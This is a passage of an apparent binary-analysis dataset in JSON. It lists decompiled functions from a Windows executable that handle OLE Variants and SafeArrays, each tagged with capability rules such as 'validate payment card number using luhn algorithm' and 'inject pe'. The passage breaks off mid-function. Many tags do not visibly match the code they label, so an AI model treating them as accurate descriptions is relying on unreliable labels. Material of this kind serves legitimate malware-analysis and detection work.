        "decompiled_code": "\nvoid fcn.0041144c(void)\n\n{\n    char cVar1;\n    uint16_t *in_EAX;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint plLbound;\n    uint ppvData;\n    uint var_310h;\n    int32_t plUbound;\n    uint16_t *psa;\n    uint pvarg;\n    uint var_300h;\n    uint var_2fch;\n    uint rgIndices;\n    \n    if ((*(in_EAX + 1) & 0x20) == 0) {\n        fcn.00411294();\n    }\n    if ((*in_EAX & 0xfff) == 0xc) {\n        if ((*in_EAX & 0x4000) == 0) {\n            psa = *(in_EAX + 4);\n        }\n        else {\n            psa = **(in_EAX + 4);\n        }\n        uVar2 = *psa;\n        if (-1 < uVar2 - 1) {\n            iVar7 = 0;\n            piVar6 = &var_300h;\n            uVar5 = uVar2;\n            do {\n                sub.oleaut32.dll_SafeArrayGetLBound(psa, iVar7 + 1, piVar6 + 1);\n                fcn.00411294();\n                sub.oleaut32.dll_SafeArrayGetUBound();\n                fcn.00411294();\n                *piVar6 = (plUbound - piVar6[1]) + 1;\n                iVar7 = iVar7 + 1;\n                piVar6 = piVar6 + 2;\n                uVar5 = uVar5 - 1;\n            } while (uVar5 != 0);\n        }\n        if (-1 < uVar2 - 1) {\n            puVar3 = &var_2fch;\n            puVar4 = &rgIndices;\n            do {\n                *puVar4 = *puVar3;\n                puVar4 = puVar4 + 1;\n                puVar3 = puVar3 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        do {\n            cVar1 = fcn.004113c0(&stack0xfffffffc);\n            if (cVar1 != '\\0') {\n                sub.oleaut32.dll_SafeArrayPtrOfIndex();\n                fcn.00411294();\n                fcn.00411644();\n            }\n            cVar1 = fcn.004113f0(&stack0xfffffffc);\n        } while (cVar1 != '\\0');\n    }\n    sub.oleaut32.dll_VariantClear(in_EAX);\n    fcn.00411294();\n    return;\n}\n",
        "token_count": 630
    },
    "00411764": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00411764(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    do {\n        uVar2 = *(arg_8h + -0x2fc + in_EAX * 8) + *(arg_8h + -0x300 + in_EAX * 8);\n        bVar1 = *(arg_8h + -0x100 + in_EAX * 4) < uVar2;\n        uVar2 = uVar2 & 0xffffff00 | bVar1;\n        in_EAX = in_EAX + -1;\n        if (!bVar1) {\n            return uVar2;\n        }\n    } while (-1 < in_EAX);\n    return uVar2;\n}\n",
        "token_count": 181
    },
    "00411794": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00411794(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    uVar3 = 1;\n    piVar1 = arg_8h + -0x100 + in_EAX * 4;\n    *piVar1 = *piVar1 + 1;\n    iVar2 = *(arg_8h + -0x2fc + in_EAX * 8);\n    if (iVar2 + *(arg_8h + -0x300 + in_EAX * 8) <= *(arg_8h + -0x100 + in_EAX * 4)) {\n        if (in_EAX == 0) {\n            uVar3 = 0;\n        }\n        else {\n            *(arg_8h + -0x100 + in_EAX * 4) = iVar2;\n            uVar3 = fcn.00411794(arg_8h);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 235
    },
    "004117f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004117f0(code *param_1, uint16_t *param_2)\n\n{\n    char cVar1;\n    ushort *in_EAX;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    uint plLbound;\n    uint var_31ch;\n    uint ppvData;\n    uint16_t *psa;\n    uint32_t cDims;\n    int32_t plUbound;\n    code *var_308h;\n    ushort *pvargDest;\n    uint rgsabound;\n    uint var_2fch;\n    uint rgIndices;\n    \n    var_308h = param_1;\n    pvargDest = in_EAX;\n    if ((*(param_2 + 1) & 0x20) == 0) {\n        fcn.00411294();\n    }\n    if ((*param_2 & 0xfff) == 0xc) {\n        if ((*param_2 & 0x4000) == 0) {\n            psa = *(param_2 + 4);\n        }\n        else {\n            psa = **(param_2 + 4);\n        }\n        uVar2 = *psa;\n        cDims = uVar2;\n        if (-1 < uVar2 - 1) {\n            iVar6 = 0;\n            piVar5 = &rgsabound;\n            do {\n                sub.oleaut32.dll_SafeArrayGetLBound(psa, iVar6 + 1, piVar5 + 1);\n                fcn.00411294();\n                sub.oleaut32.dll_SafeArrayGetUBound();\n                fcn.00411294();\n                *piVar5 = (plUbound - piVar5[1]) + 1;\n                iVar6 = iVar6 + 1;\n                piVar5 = piVar5 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        iVar6 = sub.oleaut32.dll_SafeArrayCreate(0xc, cDims, &rgsabound);\n        if (iVar6 == 0) {\n            fcn.00410fec();\n        }\n        fcn.00411644();\n        *pvargDest = 0x200c;\n        *(pvargDest + 4) = iVar6;\n        if (-1 < cDims - 1) {\n            puVar3 = &var_2fch;\n            puVar4 = &rgIndices;\n            uVar2 = cDims;\n            do {\n                *puVar4 = *puVar3;\n                puVar4 = puVar4 + 1;\n                puVar3 = puVar3 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        do {\n            cVar1 = fcn.00411764(&stack0xfffffffc);\n            if (cVar1 != '\\0') {\n                sub.oleaut32.dll_SafeArrayPtrOfIndex(psa, &rgIndices, &ppvData);\n                fcn.00411294();\n                sub.oleaut32.dll_SafeArrayPtrOfIndex(iVar6, &rgIndices, &var_31ch);\n                fcn.00411294();\n                (*var_308h)();\n            }\n            cVar1 = fcn.00411794(&stack0xfffffffc);\n        } while (cVar1 != '\\0');\n    }\n    else {\n        sub.oleaut32.dll_VariantCopy(pvargDest, param_2);\n        fcn.00411294();\n    }\n    return;\n}\n",
        "token_count": 808
    },
    "00411ab4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00411ab4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    \n    puStack36 = &fcn.00411ab4::pvarg;\n    puStack40 = 0x411acc;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x411b10;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00411a70();\n    (**0x49a984)();\n    fcn.00411d3c();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x411b17;\n    uStack44 = 0x411b0f;\n    fcn.00411644();\n    return;\n}\n",
        "token_count": 209
    },
    "0041201c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0041201c(void)\n\n{\n    uchar *puStack24;\n    uchar auStack20 [16];\n    \n    puStack24 = auStack20;\n    sub.oleaut32.dll_VariantInit();\n    (***0x495be4)(&puStack24);\n    fcn.004112a0();\n    return 0x400;\n}\n",
        "token_count": 79
    },
    "00412058": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00412058(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    uint var_4h;\n    \n    puStack32 = &fcn.00412058::pvarg;\n    puStack36 = 0x41206a;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x4120ac;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00411a70();\n    (**0x49a984)();\n    var_4h = fcn.00412100();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x4120b3;\n    uStack40 = 0x4120ab;\n    fcn.00411644();\n    return;\n}\n",
        "token_count": 218
    },
    "004120bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.004120bc(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    \n    uVar1 = fcn.00416180();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(3);\n        *param_2 = iStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 122
    },
    "00412b18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00412b18(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &fcn.00412b18::pvarg;\n    puStack40 = 0x412b2a;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x412b6f;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00411a70();\n    (**0x49a984)();\n    _var_8h = fcn.00412bd0();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x412b76;\n    uStack44 = 0x412b6e;\n    fcn.00411644();\n    return;\n}\n",
        "token_count": 241
    },
    "00412b84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00412b84(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00416180();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(0x14);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 145
    },
    "00413118": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00413118(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    uint var_1h;\n    \n    puStack32 = &fcn.00413118::pvarg;\n    puStack36 = 0x41312a;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x41316c;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &fcn.00413118::var_1h + 1;\n    fcn.00411a70();\n    (**0x49a984)();\n    var_1h._0_1_ = fcn.004131c8();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x413173;\n    uStack40 = 0x41316b;\n    fcn.00411644();\n    return;\n}\n",
        "token_count": 257
    },
    "0041351c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041351c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_24h;\n    uint var_20h;\n    uint var_10h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack52 = 0x4135d1;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    fcn.0041516c();\n    uVar3 = var_4h;\n    iVar2 = (***0x495abc)(var_4h, 0x400, 0, &var_10h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004057d4();\n        cVar1 = fcn.0040b784();\n        if (cVar1 == '\\0') {\n            fcn.004112a0();\n        }\n        else {\n            _var_10h = _var_20h;\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.004112a0();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00405530(0x4135d8);\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 338
    },
    "004135e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nfloat10 fcn.004135e0(void)\n\n{\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    sub.oleaut32.dll_VariantInit();\n    (***0x495be4)(auStack24);\n    fcn.004112a0();\n    return CONCAT44(auStack20, 5);\n}\n",
        "token_count": 76
    },
    "0041362c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041362c(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    double dStack12;\n    \n    puStack36 = &fcn.0041362c::pvarg;\n    puStack40 = 0x41363e;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x413681;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00411a70();\n    (**0x49a984)();\n    fVar1 = fcn.004136dc();\n    dStack12 = fVar1;\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x413688;\n    uStack44 = 0x413680;\n    fcn.00411644();\n    return;\n}\n",
        "token_count": 230
    },
    "00413690": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00413690(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00416180();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(5);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 142
    },
    "00413be4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00413be4(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack48 = 0x413cc0;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.0041516c();\n    uVar3 = var_4h;\n    iVar2 = (***0x4958dc)(var_4h, 0x400, 0, &var_10h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004057d4();\n        cVar1 = fcn.0040d1b0();\n        if (cVar1 == '\\0') {\n            fcn.004057d4();\n            cVar1 = fcn.0040b7a0();\n            if (cVar1 == '\\0') {\n                fcn.004112a0();\n            }\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.004112a0();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00405554(0x413cc7);\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 367
    },
    "00413cd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.00413cd0(uint arg_8h, uint arg_ch)\n\n{\n    uint pvarg;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    sub.oleaut32.dll_VariantInit(&pvarg);\n    pvarg._0_2_ = 5;\n    var_10h = arg_8h;\n    var_ch = arg_ch;\n    (***0x495be4)(&pvarg, &pvarg, 0x400, 0, 7);\n    fcn.004112a0();\n    return CONCAT44(var_ch, var_10h);\n}\n",
        "token_count": 159
    },
    "00413d30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nfloat10 fcn.00413d30(void)\n\n{\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    sub.oleaut32.dll_VariantInit();\n    (***0x495be4)(auStack24);\n    fcn.004112a0();\n    return CONCAT44(auStack20, 7);\n}\n",
        "token_count": 76
    },
    "00413d7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00413d7c(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    double dStack12;\n    \n    puStack36 = &fcn.00413d7c::pvarg;\n    puStack40 = 0x413d8e;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x413dd1;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00411a70();\n    (**0x49a984)();\n    fVar1 = fcn.00413e2c();\n    dStack12 = fVar1;\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x413dd8;\n    uStack44 = 0x413dd0;\n    fcn.00411644();\n    return;\n}\n",
        "token_count": 238
    },
    "00413de0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00413de0(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00416180();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(7);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 143
    },
    "0041417c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041417c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack36 = 0x414228;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    fcn.0041516c();\n    uVar3 = var_4h;\n    iVar2 = (***0x495c84)(var_4h, 0x400, 0, &var_10h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004057d4();\n        cVar1 = fcn.0040b7f8();\n        if (cVar1 == '\\0') {\n            fcn.004112a0();\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.004112a0();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00405530(0x41422f);\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 303
    },
    "00414238": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.00414238(uint arg_8h, uint arg_ch)\n\n{\n    uint pvarg;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    sub.oleaut32.dll_VariantInit(&pvarg);\n    pvarg._0_2_ = 5;\n    var_10h = arg_8h;\n    var_ch = arg_ch;\n    (***0x495be4)(&pvarg, &pvarg, 0x400, 0, 6);\n    fcn.004112a0();\n    return CONCAT44(var_ch, var_10h);\n}\n",
        "token_count": 158
    },
    "00414298": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nfloat10 fcn.00414298(void)\n\n{\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    sub.oleaut32.dll_VariantInit();\n    (***0x495be4)(auStack24);\n    fcn.004112a0();\n    return CONCAT44(auStack20, 6);\n}\n",
        "token_count": 75
    },
    "004142e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004142e4(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    int64_t iStack12;\n    \n    puStack36 = &fcn.004142e4::pvarg;\n    puStack40 = 0x4142f6;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x414339;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00411a70();\n    (**0x49a984)();\n    fVar1 = fcn.00414394();\n    iStack12 = ROUND(fVar1);\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x414340;\n    uStack44 = 0x414338;\n    fcn.00411644();\n    return;\n}\n",
        "token_count": 234
    },
    "00414348": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00414348(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00416180();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(6);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 142
    },
    "00414894": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414894(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint *puStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint pvarg;\n    uint var_8h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_14h = 0;\n    uStack44 = 0x414953;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = &fcn.00414894::pvarg;\n    puStack56 = 0x4148bf;\n    sub.oleaut32.dll_VariantInit();\n    uStack60 = 0x414931;\n    iStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    (***0x495be4)(&fcn.00414894::pvarg);\n    fcn.004112a0();\n    arg_8h = &fcn.00414894::var_14h;\n    fcn.00405e6c();\n    fcn.00405f58(arg_8h);\n    fcn.004057d4();\n    *in_FS_OFFSET = arg_8h;\n    fcn.00411644(0x414938);\n    return;\n}\n",
        "token_count": 347
    },
    "00414960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414960(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    \n    puStack32 = &fcn.00414960::pvarg;\n    puStack36 = 0x414975;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x4149b6;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00411a70();\n    (**0x49a984)();\n    fcn.00414a4c();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x4149bd;\n    uStack40 = 0x4149b5;\n    fcn.00411644();\n    return;\n}\n",
        "token_count": 208
    },
    "00414f88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414f88(uint param_1, uint param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint pvarg;\n    uint var_8h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x415032;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = &fcn.00414f88::pvarg;\n    puStack52 = 0x414fb0;\n    sub.oleaut32.dll_VariantInit();\n    uStack56 = 0x415015;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    uVar3 = 8;\n    uVar2 = 0;\n    uVar1 = 0x400;\n    puStack52 = &stack0xfffffffc;\n    (***0x495be4)(&fcn.00414f88::pvarg);\n    fcn.004112a0();\n    fcn.00405e6c();\n    fcn.00405f58(param_2);\n    *in_FS_OFFSET = param_2;\n    fcn.00411644(0x41501c, uVar1, uVar2, uVar3);\n    return;\n}\n",
        "token_count": 358
    },
    "00415040": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00415040(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    \n    puStack32 = &fcn.00415040::pvarg;\n    puStack36 = 0x415055;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x415096;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00411a70();\n    (**0x49a984)();\n    fcn.0041516c();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x41509d;\n    uStack40 = 0x415095;\n    fcn.00411644();\n    return;\n}\n",
        "token_count": 203
    },
    "004156c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004156c0(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    uint var_8h;\n    \n    puStack32 = &fcn.004156c0::pvarg;\n    puStack36 = 0x4156d5;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x41572a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.00411a70();\n    (**0x49a984)();\n    if (pvarg != 0xd) {\n        fcn.00410e60();\n    }\n    fcn.00407024();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x415731;\n    uStack40 = 0x415729;\n    fcn.00411644();\n    return;\n}\n",
        "token_count": 245
    },
    "00415d24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "inject pe/d5f0df8b10fc4abbbb9974951b6b6eb4"
        ],
        "decompiled_code": "\nvoid fcn.00415d24(void)\n\n{\n    char cVar1;\n    uint16_t in_AX;\n    int32_t *in_FS_OFFSET;\n    uint *puStack552;\n    int32_t iStack548;\n    uint uStack544;\n    uchar *puStack540;\n    uint var_208h;\n    uint var_204h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack540 = &stack0xfffffffc;\n    uStack544 = 0x415e4a;\n    iStack548 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffddc;\n    if ((in_AX & 0xfff) < 0x15) {\n        puStack552 = 0x415d68;\n        puStack540 = &stack0xfffffffc;\n        fcn.00405584();\n    }\n    else if (in_AX == 0x100) {\n        puStack552 = 0x415d80;\n        puStack540 = &stack0xfffffffc;\n        fcn.00405584();\n    }\n    else if (in_AX == 0x101) {\n        puStack552 = 0x415d98;\n        puStack540 = &stack0xfffffffc;\n        fcn.00405584();\n    }\n    else {\n        cVar1 = fcn.00416180();\n        if (cVar1 == '\\0') {\n            fcn.00409e8c();\n            puStack552 = 0x415e0b;\n            fcn.00405864();\n        }\n        else {\n            puStack552 = &fcn.00415d24::var_104h;\n            fcn.00404530();\n            fcn.00403098();\n            fcn.00405794();\n        }\n    }\n    if ((in_AX & 0x2000) != 0) {\n        fcn.00405864();\n    }\n    if ((in_AX & 